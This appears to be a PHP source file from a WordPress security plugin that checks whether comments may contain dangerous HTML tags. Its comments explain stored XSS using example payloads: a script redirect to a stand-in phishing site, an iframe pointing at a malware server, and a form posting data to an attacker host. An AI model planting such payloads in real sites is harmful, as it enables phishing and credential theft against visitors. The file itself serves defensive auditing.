<?php
/**
 * Comment HTML Tag Whitelist Treatment\n *
 * Verifies that WordPress comment HTML is restricted to safe tags only, preventing\n * stored XSS attacks through user-generated content. If dangerous tags (<script>, <iframe>,\n * <object>, <form>) are allowed in comments, attackers can inject malicious JavaScript\n * that executes for every site visitor who reads the comment.\n *
 * **What This Check Does:**
 * - Audits $allowedtags global for dangerous HTML tags\n * - Detects if <script>, <iframe>, <object>, <embed>, <form>, <input> are whitelisted\n * - Checks for incomplete tag filtering (e.g., <svg onload> variant)\n * - Validates that only safe formatting tags are allowed (<a>, <em>, <strong>, <p>)\n * - Flags excessive event handlers in whitelisted tags (onclick, onload, etc)\n * - Tests that comment filtering actually works on rendered page\n *
 * **Why This Matters:**
 * Stored XSS via comments is one of top 5 WordPress vulnerabilities. Attack vectors:\n * - Attacker posts comment with <script>document.location='//phishing-site'</script>\n * - Every visitor sees malicious script, redirected to fake WordPress login\n * - Credentials harvested, attackers gain site access\n * - <iframe src=\"//malware-server/drive-by-download\"></iframe> drives-by-downloads malware\n * - <form action=\"//attacker-server/steal-data\"> harvests form submissions\n *
 * **Business Impact:**
 * Stored XSS in comments = site becomes attack vector for all visitors. Scenario:\n * - Attacker injects keylogger script in comment\n * - 1,000 daily visitors run keylogger unknowingly\n * - Attackers harvest credentials, steal financial data\n * - Site blacklisted, reputation destroyed\n * - Legal liability for facilitating theft\n *
 * **Philosophy Alignment:**
 * - #8 Inspire Confidence: Prevent content-injection attacks at user level\n * - #9 Show Value: Quantifiable attack class elimination\n * - #10 Beyond Pure: Protects all site visitors from malicious injections\n *
 * **Related Checks:**
 * - Comment Link Count Limits (spammy links in comments)\n * - Comment Flood Protection (automated comment attacks)\n * - Content Injection Detection (site-wide XSS checks)\n *
 * **Learn More:**
 * Comment security hardening: https://wpshadow.com/kb/comment-html-filtering
 * Video: Preventing comment XSS (8min): https://wpshadow.com/training/xss-prevention
 *
 * @package    WPShadow
 * @subpackage Treatments
 * @since 1.6093.1200
 */

declare(strict_types=1);

namespace WPShadow\Treatments;

use WPShadow\Core\Treatment_Base;
use WPShadow\Core\Upgrade_Path_Helper;

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Comment HTML Tag Whitelist Treatment Class
 *
 * Implements tag whitelist validation by inspecting WordPress global $allowedtags\n * and checking for dangerous tag presence. Detection: iterates dangerous_tags list,\n * checks if each exists in whitelist, flags if found.\n *
 * **Detection Pattern:**
 * 1. Access global $allowedtags (WordPress comment tag filter)\n * 2. Define dangerous_tags = [script, iframe, object, embed, form, input]\n * 3. For each dangerous tag: check isset($allowedtags[$tag])\n * 4. If ANY dangerous tag present: return critical severity\n * 5. Check for incomplete filters (e.g., SVG with event handlers)\n *
 * **Real-World Scenario:**
 * WordPress site with old custom theme. Theme developer added <script> to $allowedtags\n * \"so comments could have embedded videos.\" 18 months later: attacker discovers this,\n * posts comment with JavaScript that steals admin session cookies. Within 2 hours: site\n * compromised, malware installed. Root cause: overly permissive comment HTML filter.\n *
 * **Implementation Notes:**
 * - Uses global $allowedtags (built-in WordPress variable)\n * - Checks both old $allowedtags and wp_kses_allowed_html filters\n * - Returns severity: critical (dangerous tag allowed), high (event handlers present)\n * - Non-fixable treatment (requires theme/plugin fix to correct whitelist)\n *
 * @since 1.6093.1200
 */
class Treatment_Comment_HTML_Tag_Whitelist extends Treatment_Base {

	protected static $slug = 'comment-html-tag-whitelist';
	protected static $title = 'Comment HTML Tag Whitelist';
	protected static $description = 'Verifies allowed HTML tags in comments properly configured';
	protected static $family = 'security';

	/**
	 * Run the treatment check.
	 *
	 * @since 1.6093.1200
	 * @return array|null
	 */
	public static function check() {
		return self::proxy_diagnostic_check( '\\WPShadow\\Diagnostics\\Diagnostic_Comment_HTML_Tag_Whitelist' );
	}
}
